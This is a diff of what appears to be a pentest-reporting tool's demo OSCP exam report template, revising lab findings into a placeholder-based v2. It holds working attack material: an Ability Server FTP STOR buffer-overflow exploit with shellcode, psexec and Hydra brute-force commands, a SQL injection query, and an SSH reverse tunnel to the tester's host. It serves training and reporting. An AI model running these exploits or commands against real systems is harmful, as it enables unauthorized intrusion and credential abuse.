@@ -1,48 +1,50 @@
 format = "projects/v2"
 id = "d03d7feb-a9c8-43b2-bbc2-7d72849db78c"
-name = "OSCP Exam Report Demo"
+name = "OffSec OSCP+ Exam Report v2.0"
 language = "en-US"
-tags = [
-    "demo",
-]
+tags = []
 members = []
+images = []
+files = []
 
 [[sections]]
 id = "Student"
-status = "finished"
-
-[[sections]]
-id = "methodology"
-status = "finished"
+status = "in-progress"
 
 [[sections]]
 id = "other"
-status = "finished"
-
-[[sections]]
-id = "appendix"
-status = "finished"
+status = "in-progress"
 
 [[sections]]
 id = "high-level_summary"
-status = "finished"
+status = "in-progress"
+
+[[sections]]
+id = "methodology"
+status = "in-progress"
+
+[[sections]]
+id = "appendix"
+status = "in-progress"
 
 [report_data]
-title = "OSCP Exam Report Demo"
+title = "OffSec Certified Professional"
 mail = "student@example.com"
 osid = "OS-XXXXX"
-watermark = false
-methodology = "John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date."
-penetration = "The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, John was able to successfully gain access to 10 out of the 50 systems."
-report_date = "2022-12-31"
-serviceenum = "The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed."
-housecleaning = """
-The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
+firstname = "John"
+lastname = "Doe"
+report_date = "2025-09-30"
+report_version = "2.0"
+watermark = true
+highlevel_summary = """
+{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. {{ report.firstname }} {{ report.lastname}}’s ({{ report.osid}}) overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.
 
-After the trophies on both the lab network and exam network were completed, John removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.
+When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) had administrative level access to multiple systems. All systems were successfully exploited and access granted.
 """
+recommendations = "{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date."
+methodology = "{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) utilized a widely adopted approach to perform penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure. Below is a breakout of how {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to identify and exploit the variety of systems and includes all individual vulnerabilities found."
 infogathering = """
-The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, John was tasked with exploiting the lab and exam network. The specific IP addresses were:
+The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  was tasked with exploiting the lab and exam network. The specific IP addresses were:
 
 **Exam Network:**
 
@@ -51,155 +53,30 @@ The information gathering portion of a penetration test focuses on identifying t
 * 172.16.203.135
 * 172.16.203.136
 """
+serviceenum = "The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed."
+penetration = "The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  was able to successfully gain access to 10 out of the 50 systems."
 maintainaccess = """
 Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit. 
 
-John added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.
+{{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.
 """
-report_version = "1.0"
-recommendations = "John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date."
+housecleaning = """
+The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
+
+After the trophies on both the lab network and exam network were completed, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.
+"""
 appendix_sections = []
-highlevel_summary = """
-John Doe was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. John’s overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.
-
-When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, John had administrative level access to multiple systems. All systems were successfully exploited and access granted.
-"""
-lastname = "Doe"
-firstname = "John"
 
 [[findings]]
-id = "7d9c0db2-888c-4b03-a5e5-88cdc0684d63"
-status = "finished"
-
-[findings.data]
-title = "DC"
-cvss = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
-ip_address = "10.5.5.30"
-serviceenum = """
-**Port Scan Results**
-
-| IP Address | Ports Open |
-| ------- | ------- |
-| 10.5.5.30   | **TCP:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389 |
-"""
-initialaccess = """
-**Steps to reproduce the attack:** John was able to reuse a temporary password that the administrator left for Alex.
-
-```
-proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py admin:UWyBGeTp3Bhw7f@10.5.5.30
-```
-
-![Screenshot](/images/name/grafik-88002.jpg)
-"""
-postexploitation = """
-**System Proof Screenshot:**
-![Proof](/images/name/grafik-5838.jpg)
-"""
-isActiveDirectory = true
-privilegeescalation = ""
-hostname = "TODO: fill field in report"
-
-[[findings]]
-id = "d4acc7d2-2a2a-4e50-8f7f-54415a8d47d0"
-status = "finished"
-
-[findings.data]
-title = "Poultry"
-cvss = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
-ip_address = "10.5.5.20"
-serviceenum = """
-**Port Scan Results**
-
-| IP Address | Ports Open |
-| ------- | ------- |
-| 10.5.5.20   | **TCP:** 135, 139, 445, 3389 |
-"""
-initialaccess = """
-**Steps to reproduce the attack:** with the credentials at hand and a reverse tunnel established, John connected to an RDP session using proxychains accepting the certificate when prompted and entering the retrieved password afterward.
-
-```
-proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
-```
-"""
-postexploitation = """
-**Local Proof Screenshot:** 
-![Proof](/images/name/grafik-96640.jpg)
-
-John noticed the presence of the Thunderbird program on the user’s desktop, and while checking Alex’s inbox he found the email from a local administrator Roger:
-
-![Screenshot](/images/name/grafik-18239.jpg)
-"""
-isActiveDirectory = true
-privilegeescalation = ""
-hostname = "TODO: fill field in report"
-
-[[findings]]
-id = "a62710d4-3c47-4e4b-826c-35b581ac47fd"
-status = "finished"
-
-[findings.data]
-title = "Ajla"
-cvss = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
-ip_address = "10.4.4.10"
-serviceenum = """
-**Port Scan Results**
-
-| IP Address | Ports Open |
-| ------- | ------- |
-| 10.4.4.10   | **TCP:** 22, 80 |
-"""
-initialaccess = """
-**Vulnerability Explanation:** The user account on the Ajla host was protected by a trivial password that was cracked within 5 minutes of brute-forcing.
-
-**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.
-
-**Steps to reproduce the attack:** om the initial service scan John discovered that this host is called Ajla. After adding the target’s IP to the /etc/hosts file, the Hydra tool was run against the SSH service using the machine’s DNS name instead of its IP. With the extracted password at hand John was able to log in as ajla using SSH.
-
-```
-hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh
-```
-
-![Screenshot](/images/name/grafik-5026.jpg)
-"""
-postexploitation = """
-**System Proof Screenshot:**
-
-![](/images/name/grafik-58203.jpg)
-
-After collecting the proof files and establishing a backdoor using SSH, John began the enumeration of the filesystem for the presence of interesting files. He noticed that there was a mounted share originating from the 10.5.5.20 IP. Inspecting a custom sysreport.ps1 script in the /mnt/scripts directory he found cleartext credentials for the “sandbox\\alex” user. Taking into consideration the type of scripts in this directory and the username structure, it seems that the “Poultry” host is a part of the Active Directory environment.
-
-![](/images/name/grafik-54644.jpg)
-
-John began the lateral movement by establishing a reverse dynamic port forwarding using SSH. First, he generated a new pair of SSH keys and added those to the authorized_keys file on his Kali VM, then he just needed to issue a single SSH port forwarding command:
-
-```
-ssh-keygen -t rsa -N ‘’ -f ~/.ssh/key
-ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key kali@192.168.119.164
-```
-
-With the dynamic reverse tunnel established, John only needed to edit the /etc/proxychains.conf to use the port 1080.
-"""
-isActiveDirectory = true
-privilegeescalation = """
-**Vulnerability Explation:** sudo group allows any user in this group to escalate privileges to the root if
-they know the user’s password.
-
-**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.
-
-**Steps to reproduce the attack:** John spotted that the ajla user was a member of the sudo group immediately upon logging in and using the “id” command. And knowing user’s password, he only needed to use a single command “sudo su” in order to obtain a root shell.
-
-![Screenshot](/images/name/grafik-32877.jpg)
-"""
-hostname = "TODO: fill field in report"
-
-[[findings]]
-id = "2736e064-c217-4a29-a136-35af9a219ef3"
-status = "finished"
+id = "c7f12f17-96bf-4899-b10f-2b1a513382e8"
+status = "in-progress"
+order = 1
 
 [findings.data]
 title = "Target #1"
-cvss = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+severity = "critical"
 ip_address = "172.16.203.134"
+target_type = "independent"
 serviceenum = """
 **Port Scan Results**
 
@@ -218,7 +95,7 @@ initialaccess = """
 **Steps to reproduce the attack:** The operating system was different from the known public exploit. A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.
 
 **Proof of Concept Code:**
-```python
+```python highlight-manual
 ###################################
 # Ability Server 2.34 FTP STOR Buffer Overflow # Advanced, secure and easy to use FTP Server. # 21 Oct 2004 - muts ###################################
 # D:\\BO>ability-2.34-ftp-stor.py ###################################
@@ -227,39 +104,57 @@ initialaccess = """
 # Microsoft Windows XP [Version 5.1.2600]
 # (C) Copyright 1985-2001 Microsoft Corp.
 # D:\\Program Files\\abilitywebserver> ###################################
+
 import ftplib
 from ftplib import FTP
 import struct
+
 print "\\n\\n################################"
 print "\\nAbility Server 2.34 FTP STOR buffer Overflow" print "\\nFor Educational Purposes Only!\\n"
 print "###################################"
+
 # Shellcode taken from Sergio Alvarez's "Win32 Stack Buffer Overflow Tutorial"
 sc = "\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1\\x5e\\x81\\x73\\x17\\xe0\\x66"
- 8 | Page
-   sc += "\\x1c\\xc2\\x83\\xeb\\xfc\\xe2\\xf4\\x1c\\x8e\\x4a\\xc2\\xe0\\x66\\x4f\\x97\\xb6" sc += "\\x1a\\x38\\xd6\\x95\\x87\\x97\\x98\\xc4\\x67\\xf7\\xa4\\x6b\\x6a\\x57\\x49\\xba" sc += "\\x7a\\x1d\\x29\\x6b\\x62\\x97\\xc3\\x08\\x8d\\x1e\\xf3\\x20\\x39\\x42\\x9f\\xbb" sc += "\\xa4\\x14\\xc2\\xbe\\x0c\\x2c\\x9b\\x84\\xed\\x05\\x49\\xbb\\x6a\\x97\\x99\\xfc" sc += "\\xed\\x07\\x49\\xbb\\x6e\\x4f\\xaa\\x6e\\x28\\x12\\x2e\\x1f\\xb0\\x95\\x05\\x61" sc += "\\x8a\\x1c\\xc3\\xe0\\x66\\x4b\\x94\\xb3\\xef\\xf9\\x2a\\xc7\\x66\\x1c\\xc2\\x70" sc += "\\x67\\x1c\\xc2\\x56\\x7f\\x04\\x25\\x44\\x7f\\x6c\\x2b\\x05\\x2f\\x9a\\x8b\\x44" sc += "\\x7c\\x6c\\x05\\x44\\xcb\\x32\\x2b\\x39\\x6f\\xe9\\x6f\\x2b\\x8b\\xe0\\xf9\\xb7" sc += "\\x35\\x2e\\x9d\\xd3\\x54\\x1c\\x99\\x6d\\x2d\\x3c\\x93\\x1f\\xb1\\x95\\x1d\\x69" sc += "\\xa5\\x91\\xb7\\xf4\\x0c\\x1b\\x9b\\xb1\\x35\\xe3\\xf6\\x6f\\x99\\x49\\xc6\\xb9" sc += "\\xef\\x18\\x4c\\x02\\x94\\x37\\xe5\\xb4\\x99\\x2b\\x3d\\xb5\\x56\\x2d\\x02\\xb0" sc += "\\x36\\x4c\\x92\\xa0\\x36\\x5c\\x92\\x1f\\x33\\x30\\x4b\\x27\\x57\\xc7\\x91\\xb3" sc += "\\x0e\\x1e\\xc2\\xf1\\x3a\\x95\\x22\\x8a\\x76\\x4c\\x95\\x1f\\x33\\x38\\x91\\xb7" sc += "\\x99\\x49\\xea\\xb3\\x32\\x4b\\x3d\\xb5\\x46\\x95\\x05\\x88\\x25\\x51\\x86\\xe0" sc += "\\xef\\xff\\x45\\x1a\\x57\\xdc\\x4f\\x9c\\x42\\xb0\\xa8\\xf5\\x3f\\xef\\x69\\x67" sc += "\\x9c\\x9f\\x2e\\xb4\\xa0\\x58\\xe6\\xf0\\x22\\x7a\\x05\\xa4\\x42\\x20\\xc3\\xe1" sc += "\\xef\\x60\\xe6\\xa8\\xef\\x60\\xe6\\xac\\xef\\x60\\xe6\\xb0\\xeb\\x58\\xe6\\xf0" sc += "\\x32\\x4c\\x93\\xb1\\x37\\x5d\\x93\\xa9\\x37\\x4d\\x91\\xb1\\x99\\x69\\xc2\\x88" sc += "\\x14\\xe2\\x71\\xf6\\x99\\x49\\xc6\\x1f\\xb6\\x95\\x24\\x1f\\x13\\x1c\\xaa\\x4d" sc += "\\xbf\\x19\\x0c\\x1f\\x33\\x18\\x4b\\x23\\x0c\\xe3\\x3d\\xd6\\x99\\xcf\\x3d\\x95" sc += "\\x66\\x74\\x32\\x6a\\x62\\x43\\x3d\\xb5\\x62\\x2d\\x19\\xb3\\x99\\xcc\\xc2"
-# Change RET address if need be.
-buffer = '\\x41'*966+struct.pack('<L', 0x7C2FA0F7)+'\\x42'*32+sc # RET Windows 2000 Server SP4
-#buffer = '\\x41'*970+struct.pack('<L', 0x7D17D737)+'\\x42'*32+sc # RET Windows XP SP2 try:
-# Edit the IP, Username and Password.
-    9 | Page
+sc += "\\x1c\\xc2\\x83\\xeb\\xfc\\xe2\\xf4\\x1c\\x8e\\x4a\\xc2\\xe0\\x66\\x4f\\x97\\xb6" 
+sc += "\\x1a\\x38\\xd6\\x95\\x87\\x97\\x98\\xc4\\x67\\xf7\\xa4\\x6b\\x6a\\x57\\x49\\xba" 
+sc += "\\x7a\\x1d\\x29\\x6b\\x62\\x97\\xc3\\x08\\x8d\\x1e\\xf3\\x20\\x39\\x42\\x9f\\xbb" 
+sc += "\\xa4\\x14\\xc2\\xbe\\x0c\\x2c\\x9b\\x84\\xed\\x05\\x49\\xbb\\x6a\\x97\\x99\\xfc" 
+sc += "\\xed\\x07\\x49\\xbb\\x6e\\x4f\\xaa\\x6e\\x28\\x12\\x2e\\x1f\\xb0\\x95\\x05\\x61" 
+sc += "\\x8a\\x1c\\xc3\\xe0\\x66\\x4b\\x94\\xb3\\xef\\xf9\\x2a\\xc7\\x66\\x1c\\xc2\\x70" 
+sc += "\\x67\\x1c\\xc2\\x56\\x7f\\x04\\x25\\x44\\x7f\\x6c\\x2b\\x05\\x2f\\x9a\\x8b\\x44" 
+sc += "\\x7c\\x6c\\x05\\x44\\xcb\\x32\\x2b\\x39\\x6f\\xe9\\x6f\\x2b\\x8b\\xe0\\xf9\\xb7" 
+sc += "\\x35\\x2e\\x9d\\xd3\\x54\\x1c\\x99\\x6d\\x2d\\x3c\\x93\\x1f\\xb1\\x95\\x1d\\x69" 
+sc += "\\xa5\\x91\\xb7\\xf4\\x0c\\x1b\\x9b\\xb1\\x35\\xe3\\xf6\\x6f\\x99\\x49\\xc6\\xb9" 
+sc += "\\xef\\x18\\x4c\\x02\\x94\\x37\\xe5\\xb4\\x99\\x2b\\x3d\\xb5\\x56\\x2d\\x02\\xb0" 
+sc += "\\x36\\x4c\\x92\\xa0\\x36\\x5c\\x92\\x1f\\x33\\x30\\x4b\\x27\\x57\\xc7\\x91\\xb3" 
+sc += "\\x0e\\x1e\\xc2\\xf1\\x3a\\x95\\x22\\x8a\\x76\\x4c\\x95\\x1f\\x33\\x38\\x91\\xb7" 
+sc += "\\x99\\x49\\xea\\xb3\\x32\\x4b\\x3d\\xb5\\x46\\x95\\x05\\x88\\x25\\x51\\x86\\xe0" 
+sc += "\\xef\\xff\\x45\\x1a\\x57\\xdc\\x4f\\x9c\\x42\\xb0\\xa8\\xf5\\x3f\\xef\\x69\\x67" 
+sc += "\\x9c\\x9f\\x2e\\xb4\\xa0\\x58\\xe6\\xf0\\x22\\x7a\\x05\\xa4\\x42\\x20\\xc3\\xe1" 
+sc += "\\xef\\x60\\xe6\\xa8\\xef\\x60\\xe6\\xac\\xef\\x60\\xe6\\xb0\\xeb\\x58\\xe6\\xf0" 
+sc += "\\x32\\x4c\\x93\\xb1\\x37\\x5d\\x93\\xa9\\x37\\x4d\\x91\\xb1\\x99\\x69\\xc2\\x88" 
+sc += "\\x14\\xe2\\x71\\xf6\\x99\\x49\\xc6\\x1f\\xb6\\x95\\x24\\x1f\\x13\\x1c\\xaa\\x4d" 
+sc += "\\xbf\\x19\\x0c\\x1f\\x33\\x18\\x4b\\x23\\x0c\\xe3\\x3d\\xd6\\x99\\xcf\\x3d\\x95" 
+sc += "\\x66\\x74\\x32\\x6a\\x62\\x43\\x3d\\xb5\\x62\\x2d\\x19\\xb3\\x99\\xcc\\xc2"
 
- 
-ftp = FTP('127.0.0.1')
-ftp.login('ftp','ftp')
+# Change RET address if need be.
+buffer = §§'\\x41'*966+struct.pack('<L', 0x7C2FA0F7)+'\\x42'*32+sc§§ # RET Windows 2000 Server SP4
+
+#buffer = '\\x41'*970+struct.pack('<L', 0x7D17D737)+'\\x42'*32+sc # RET Windows XP SP2 try:
+
+# Edit the IP, Username and Password.
+ftp = FTP('§§127.0.0.1§§')
+ftp.login('§§ftp§§','§§ftp§§')
 print "\\nEvil Buffer sent..."
 print "\\nTry connecting with netcat to port 4444 on the remote machine." except:
 print "\\nCould not Connect to FTP Server."
+
 try:
-ftp.transfercmd("STOR " + buffer)
+    ftp.transfercmd("STOR " + buffer)
 except:
-print "\\nDone."
+    print "\\nDone."
 ```
 """
-postexploitation = """
-**System Proof Screenshot:**
-![Proof](/images/name/grafik-48948.jpg)
-"""
-isActiveDirectory = false
 privilegeescalation = """
 **Vulnerability Explation:** After establishing a foothold on target, John noticed there were several applications running locally, one of them, a custom web application on port 80 was prone to SQL Injection attacks. Using Chisel for port forwarding, John was able to access the web application. When performing the penetration test, John noticed error-based MySQL Injection on the taxid query string parameter. While enumerating table data, John was able to successfully extract the database root account login and password credentials that were unencrypted that also matched username and password accounts for the administrative user account on the system and John was able to log in remotely using RDP. This allowed for a successful breach of the operating system as well as all data contained on the system.
 
@@ -271,10 +166,69 @@ data, ensure that the user is running off of a limited user account, and that an
 SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE “%root%"
 ```
 
-**Screenshot:** 
-![Screenshot](/images/name/grafik-40126.jpg)
 """
-hostname = "TODO: fill field in report"
+postexploitation = ""
+
+[[findings]]
+id = "11f16a32-b884-49b2-87cc-ae3d7576423e"
+order = 2
+status = "in-progress"
+
+[findings.data]
+title = "Ajla"
+severity = "critical"
+ip_address = "10.4.4.10"
+target_type = "activedirectoryset"
+serviceenum = """
+**Port Scan Results**
+
+| IP Address | Ports Open |
+| ------- | ------- |
+| 10.4.4.10  | **TCP:** 22, 80 |
+| 10.5.5.20  | **TCP:** 135, 139, 445, 3389 |
+| 10.5.5.30  | **TCP:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389 |
+"""
+initialaccess = """
+**Vulnerability Explation:** The user account on the Ajla host was protected by a trivial password that was cracked within 5 minutes of brute-forcing.
+
+**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.
+
+**Steps to reproduce the attack:** from the initial service scan John discovered that this host is called Ajla. After adding the target’s IP to the /etc/hosts file, the Hydra tool was run against the SSH service using the machine’s DNS name instead of its IP. With the extracted password at hand John was able to log in as ajla using SSH.
+
+```
+└─$ hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh
+```
+
+![](/images/name/image.png){width="auto"}
+"""
+privilegeescalation = """
+**Vulnerability Explanation:** sudo group allows any user in this group to escalate privileges to the root if they know the user’s password.
+
+**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.
+
+**Steps to reproduce the attack:** John spotted that the ajla user was a member of the sudo group immediately upon logging in and using the “id” command. And knowing user’s password, he only needed to use a single command “sudo su” in order to obtain a root shell.
+
+![](/images/name/image-947c2ylq.png){width="auto"}
+"""
+postexploitation = """
+**System Proof Screenshot:**
+![](/images/name/image-FFCKmnkq.png){width="auto"}
+
+After collecting the proof files and establishing a backdoor using SSH, John began the enumeration of the filesystem for the presence of interesting files. He noticed that there was a mounted share originating from the 10.5.5.20 IP. Inspecting a custom sysreport.ps1 script in the /mnt/scripts directory he found cleartext credentials for the “sandbox\\alex” user. Taking into consideration the type of scripts in this directory and the username structure, it seems that the “Poultry” host is a part of the Active Directory environment.
+
+![](/images/name/image-qB33y4BC.png){width="auto"}
+
+John began the lateral movement by establishing a reverse dynamic port forwarding using SSH. First, he generated a new pair of SSH keys and added those to the authorized\\_keys file on his Kali VM, then he just needed to issue a single SSH port forwarding command:
+
+
+```
+└─$ ssh-keygen -t rsa -N ‘’ -f \\~/.ssh/key
+
+└─$ ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key <kali@192.168.119.164>
+```
+
+With the dynamic reverse tunnel established, John only needed to edit the /etc/proxychains.conf to use the port 1080.
+"""
 
 [project_type]
 file = "../offsec-designs/oscp.toml"
